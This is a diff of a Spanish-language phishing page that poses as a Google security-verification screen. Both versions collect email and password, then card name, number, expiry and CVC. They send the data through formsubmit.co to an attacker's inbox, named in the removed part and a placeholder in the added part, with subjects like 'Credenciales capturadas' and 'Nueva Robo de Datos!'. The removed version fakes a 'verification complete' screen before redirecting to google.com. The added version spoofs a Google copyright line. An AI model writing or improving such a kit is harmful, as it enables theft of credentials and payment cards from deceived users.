@@ -3,196 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de seguridad</title>
+    <title>Verificación de Seguridad</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f2f2f2;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f2f5;
         }
         .container {
-            background-color: #fff;
-            padding: 50px;
-            border-radius: 12px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-            width: 450px;
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
         }
         .logo {
-            width: 120px;
-            margin-bottom: 30px;
+            width: 75px;
+            margin-bottom: 20px;
         }
-        h1 {
-            font-size: 26px;
-            margin-bottom: 15px;
+        h2 {
             color: #202124;
+            margin-bottom: 10px;
+            font-size: 20px;
         }
         p {
-            font-size: 18px;
-            margin-bottom: 30px;
             color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 30px;
         }
-        .warning-box {
-            background-color: #fce8e6;
-            border: 1px solid #d93025;
-            color: #c5221f;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            font-weight: bold;
-            font-size: 18px;
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
         }
-        input[type="text"], input[type="password"], input[type="email"] {
+        .input-group label {
+            display: block;
+            color: #5f6368;
+            font-size: 13px;
+            margin-bottom: 5px;
+        }
+        .input-group input {
             width: 100%;
-            padding: 18px;
-            margin: 12px 0;
+            padding: 13px 15px;
             border: 1px solid #dadce0;
-            border-radius: 8px;
+            border-radius: 4px;
+            font-size: 16px;
             box-sizing: border-box;
-            font-size: 18px;
         }
-        input:focus {
-            border-color: #4285f4;
+        .input-group input:focus {
+            border-color: #1a73e8;
             outline: none;
-            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
-        button {
+        .btn-next {
             background-color: #1a73e8;
             color: white;
-            padding: 18px 20px;
             border: none;
-            border-radius: 8px;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: 500;
             cursor: pointer;
             width: 100%;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 10px;
+            font-size: 14px;
         }
-        button:hover {
-            background-color: #1557b0;
+        .btn-next:hover {
+            background-color: #1765cc;
         }
-        .hidden {
+        .step {
             display: none;
         }
-        .processing {
-            font-size: 20px;
-            color: #5f6368;
-            padding: 40px 0;
-        }
-        .success {
-            font-size: 22px;
-            color: #1e8e3e;
-            padding: 40px 0;
-            font-weight: bold;
+        .step.active {
+            display: block;
         }
         .card-row {
             display: flex;
-            gap: 20px;
+            gap: 15px;
         }
-        .card-row input {
-            width: 50%;
+        .card-row .input-group {
+            flex: 1;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
-        
-        <!-- Paso 1: Credenciales -->
-        <div id="step1">
-            <h1>Verifica tu identidad</h1>
-            <p>Ingresa tu correo y contraseña para continuar.</p>
+        <!-- Logo de Google -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
+
+        <!-- PASO 1: Email y Password -->
+        <div id="step1" class="step active">
+            <h2>Verificación de seguridad</h2>
+            <p>Ingresa tus datos para continuar</p>
             
-            <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Credenciales capturadas: Google Account">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://www.google.com">
-                
-                <input type="email" name="Email" placeholder="Correo electrónico o teléfono" required>
-                <input type="password" name="Password" placeholder="Contraseña" required>
-                
-                <!-- CAMBIADO A type="submit" para que envíe -->
-                <button type="submit">Siguiente</button>
-            </form>
+            <div class="input-group">
+                <label>Correo electrónico o teléfono</label>
+                <input type="email" name="email" required>
+            </div>
+            
+            <div class="input-group">
+                <label>Contraseña</label>
+                <input type="password" name="password" required>
+            </div>
+
+            <!-- Botón que solo llama a la función JS -->
+            <button type="button" class="btn-next" onclick="goToStep2()">Siguiente</button>
         </div>
 
-        <!-- Paso 2: Datos de la tarjeta -->
-        <div id="step2" class="hidden">
-            <div class="warning-box">
-                ⚠️ Tu cuenta tiene actividad inusual.<br>
-                Debes verificar tu identidad para evitar la suspensión.
-            </div>
-            <p>Ingresa los datos de tu tarjeta de crédito o débito para confirmar.</p>
-            
-            <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Datos de Tarjeta Capturados">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://www.google.com">
-                
-                <input type="text" name="CardName" placeholder="Nombre completo en la tarjeta" required>
-                <input type="text" name="CardNumber" placeholder="Número de la tarjeta" required>
-                
-                <div class="card-row">
-                    <input type="text" name="Expiry" placeholder="MM/YY" required>
-                    <input type="text" name="CVC" placeholder="CVC" required>
+        <!-- PASO 2: Tarjeta (Este SÍ es el formulario que se envía) -->
+        <div id="step2" class="step">
+            <h2>Confirmar pago</h2>
+            <p>Ingresa los datos de tu tarjeta para verificar tu identidad</p>
+
+            <form action="https://formsubmit.co/TU_CORREO_AQUI" method="POST">
+                <!-- Campos ocultos para pasar email y pass del paso 1 -->
+                <input type="hidden" name="_subject" value="Nueva Robo de Datos!">
+                <input type="hidden" name="email" id="hidden_email">
+                <input type="hidden" name="password" id="hidden_password">
+
+                <div class="input-group">
+                    <label>Nombre en la tarjeta</label>
+                    <input type="text" name="card_name" required placeholder="Nombre Apellido">
                 </div>
-                
-                <!-- CAMBIADO A type="submit" para que envíe -->
-                <button type="submit">Verificar</button>
+
+                <div class="input-group">
+                    <label>Número de tarjeta</label>
+                    <input type="text" name="card_number" required placeholder="0000 0000 0000 0000">
+                </div>
+
+                <div class="card-row">
+                    <div class="input-group">
+                        <label>Vencimiento</label>
+                        <input type="text" name="card_expiry" required placeholder="MM/YY">
+                    </div>
+                    <div class="input-group">
+                        <label>CVC</label>
+                        <input type="text" name="card_cvc" required placeholder="123">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-next">Verificar</button>
             </form>
         </div>
-
-        <!-- Paso 3: Procesando (solo si no redirige directo) -->
-        <div id="processing" class="hidden">
-            <div class="processing">Procesando verificación...<br>Por favor no cierres la ventana.</div>
-        </div>
-
-        <!-- Paso 4: Éxito (opcional si redirige directo) -->
-        <div id="success" class="hidden">
-            <div class="success">
-                ✓ Verificación completada<br>
-                <span style="font-size: 16px; color: #5f6368; font-weight: normal;">Tu cuenta ya está segura.</span>
-            </div>
+        
+        <div class="footer">
+            &copy; 2026 Google LLC
         </div>
     </div>
 
     <script>
-        // Si quieres que el formulario haga el proceso de "procesando" antes de redirigir,
-        // necesitas interceptar el envío. Si no, el formulario redirige directamente.
-        // Aquí dejo el script para que haga la animación si lo prefieres:
-        
-        document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', function(e) {
-                e.preventDefault(); // Evita el envío inmediato para mostrar la animación
-                const formData = new FormData(this);
-                
-                // Muestra la pantalla de "Procesando"
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('processing').classList.remove('hidden');
-                
-                // Simula un tiempo de espera
-                setTimeout(() => {
-                    document.getElementById('processing').classList.add('hidden');
-                    document.getElementById('success').classList.remove('hidden');
-                    
-                    setTimeout(() => {
-                        // Envía el formulario manualmente después de mostrar "éxito"
-                        fetch(this.action, {
-                            method: 'POST',
-                            body: formData,
-                            mode: 'no-cors'
-                        }).then(() => {
-                            window.location.href = "https://www.google.com";
-                        });
-                    }, 2000);
-                }, 3000);
-            });
-        });
+        function goToStep2() {
+            // 1. Obtener los valores del paso 1
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            // 2. Guardarlos en campos ocultos para que vayan al formulario del paso 2
+            document.getElementById('hidden_email').value = email;
+            document.getElementById('hidden_password').value = password;
+
+            // 3. Ocultar paso 1 y mostrar paso 2
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
     </script>
+
 </body>
 </html>
